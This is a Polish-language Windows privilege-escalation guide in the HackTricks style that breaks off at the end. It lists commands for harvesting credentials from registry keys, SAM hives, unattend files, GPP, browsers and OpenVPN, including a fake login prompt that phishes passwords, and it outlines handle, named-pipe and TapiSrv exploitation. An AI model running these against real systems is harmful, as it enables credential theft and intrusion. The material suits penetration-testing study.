Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź jednocześnie rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) informuje, że hasła mogą być przechowywane w postaci jawnej lub zaszyfrowane kluczem przechowywanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla tożsamości z wyższymi uprawnieniami; sama nazwa pliku nie dowodzi ani możliwości jego odczytu, ani ponownego użycia poświadczeń. Ścieżka jest wskazówką inwentaryzacyjną, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w standardowych wynikach enumeracji.

Osobny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty i interfejs powiązania konsoli administratora, nawet gdy używana jest zewnętrzna baza danych. Openfire często wiąże konsolę administratora z loopback; lokalne konto nadal może uzyskać dostęp do tego adresu, jeśli listener działa. Sprawdź łącznie faktyczny listener, uprawnioną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może doprowadzić do uruchomienia jej kodu w kontekście usługi; może to oznaczać wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta lub czytelna ścieżka konfiguracji same w sobie nie dowodzą dostępu do konsoli administratora ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania analizą kryminalistyczną

Konfiguracje serwera Velociraptor, zazwyczaj nazywane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik z niższymi uprawnieniami może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie potwierdza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może go nie zawierać.

Na serwerze Windows sprawdź uprawnienia ACL do konfiguracji **serwera** w katalogu instalacyjnym i wszelkich chronionych kopiach zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli skonfigurowana ścieżka usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że faktycznie znajduje się w nim `CA.private_key`. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Dostarczany przez producenta przepływ pracy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale potrzebna jest również skuteczna rola po stronie serwera; jej utworzenie lub zmiana może wymagać dostępu do zapisu w bazie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewnić ścieżkę dostępu, nawet gdy zapis jest niedostępny. Zapytania API z uprawnieniami do wykonywania kodu działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych uprawnień ACL, przechowuj klucz podpisujący CA offline, jeśli to możliwe, oraz ogranicz role API i dostęp do listenerów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) oraz [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) podaje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ich ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane dane uwierzytelniające są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli w tej ścieżce znajdziesz jakikolwiek wpis, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć kilka kluczy ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na komputer. Klucz rejestru HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki nienadzorowane

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe hive’y `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on hive’y, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często są fałszywymi tropami. Udział SMB to osobna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy jest objęty zakresem. Zobacz wskazówki Microsoftu dotyczące [obrazów Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [informacje o plikach hive rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Buforowane hasło GPP

Dostępna była wcześniej funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Metoda ta miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co pomaga w identyfikacji i naprawie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korzystanie z crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z poświadczeniami:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w webroot IIS

Stare archiwum ZIP umieszczone bezpośrednio w udostępnianym webroot może ujawniać wcześniejsze pliki konfiguracyjne i dane uwierzytelniające, których można ponownie użyć. Sprawdź skonfigurowaną fizyczną ścieżkę witryny i upewnij się, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz to za ekspozycję. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających lub danych innego użytkownika**, jeśli sądzisz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które kiedyś zawierały **hasła** w **postaci zwykłego tekstu** lub w **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; sama jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim danych uwierzytelniających. Sprawdź dostępne profile użytkowników i skonfigurowane lokalizacje główne udostępniania plików, aby ustalić, gdzie przechowywane są takie pliki.

Plik KeePass `.kdbx`, który można odczytać, również jest jedynie tropem wskazującym na zaszyfrowany sejf. Do jego odblokowania potrzebne jest prawidłowe hasło główne oraz każdy skonfigurowany plik klucza lub inne czynniki uwierzytelniania. Jeśli podczas autoryzowanego przeglądu znajdziesz we wpisie parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie daje uprawnień Administrator ani SYSTEM; dostęp do zdalnej usługi, uprawnienia konta i każdy odrębny etap uruchamiania usługi również muszą być zapewnione. Inwentaryzacja powinna odnotowywać ścieżkę do sejfu i możliwość jego odczytu, a nie wyświetlać bazy danych ani zapisanych danych uwierzytelniających.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie ma możliwej do odzyskania kopii zapasowej. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód, że zawiera prawidłowy sekret.

Dostępny, usunięty plik `.pfx` może też wskazywać na możliwość **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker oceniają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła modyfikować konkretny skrypt, obowiązująca reguła akceptowała jego nowy podpis dla tego skryptu i konta docelowego oraz aby zaplanowane zadanie lub inny proces działający z wyższymi uprawnieniami rzeczywiście go uruchamiał. Sama nazwa pliku `.pfx`, podmiot certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, listy ACL, zasady i polecenie zaplanowanego zadania.

Sprawdź również dostępne bazy danych profili klientów komunikatorów, notatki i otrzymane pliki pod kątem wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w nazwanym archiwum kopii zapasowej. Takie materiały mogą zapewnić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz upoważnienie do dostępu. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych w trybie offline wymaga również pasującego pliku hive `SYSTEM`, zgodnie z opisem w [procedurze dotyczącej kopii zapasowych i grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików ani zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Do **odzyskiwania haseł** zapisanych przez kilka programów możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy OpenSSH z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądania

Sprawdź bazy danych, w których przechowywane są hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — być może zapisano tam **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a `Local State` — w nadrzędnym katalogu `User Data`. [Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` może zmienić tę lokalizację. Sama obecność plików wskazuje jedynie na potencjalny magazyn poświadczeń: potwierdź, że pliki są czytelne, że masz dostęp do kontekstu DPAPI danego użytkownika lub innych autoryzowanych materiałów kluczowych oraz że zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu stanowią parę: plik klucza i plik z zaszyfrowanymi loginami. Ich obecność wskazuje jedynie na potencjalne źródło: sprawdź, czy oba pliki są czytelne, czy zawierają zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim stwierdzisz, że poświadczenia są użyteczne. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do kontrolowania grup oraz uprawnienia grupy do [odczytu lub odszyfrowania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają ścieżki do uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a jego funkcjonalność jest udostępniana przez co najmniej jeden interfejs, identyfikowany za pomocą identyfikatora interfejsu (IID).

Klasy i interfejsy COM są zdefiniowane odpowiednio w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W kluczach CLSID tego rejestru można znaleźć podrzędny klucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na plik **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątków).

![Historia przeglądania — COM DLL Overwriting: W kluczach CLSID tego rejestru można znaleźć podrzędny klucz InProcServer32, który zawiera wartość domyślną wskazującą na plik DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolną z bibliotek DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli ta biblioteka DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukaj plik o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Wyszukaj w rejestrze nazwy kluczy i hasła**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf** stworzony przeze mnie, który **automatycznie uruchamia każdy moduł POST metasploit wyszukujący dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedziczący wszystkie otwarte uchwyty procesu nadrzędnego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o **wykrywaniu i wykorzystywaniu tej podatności**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Podszywanie się pod klienta Named Pipe

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację procesów i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom wymieniać dane, nawet za pośrednictwem różnych sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go utworzył, może **przejąć tożsamość** **klienta**, o ile ma wymagane uprawnienie **SeImpersonate**. Wykrycie **uprzywilejowanego procesu**, który komunikuje się przez potok, pod który możesz się podszyć, stwarza możliwość **uzyskania wyższych uprawnień** poprzez przejęcie tożsamości tego procesu, gdy wejdzie w interakcję z utworzonym przez ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie umożliwia również **przechwytywanie komunikacji named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić listę wszystkich potoków i znaleźć privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD przez Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zamienić `ClientAttach` w dowolny **zapis 4 bajtów** do dowolnego istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację line za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację i zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
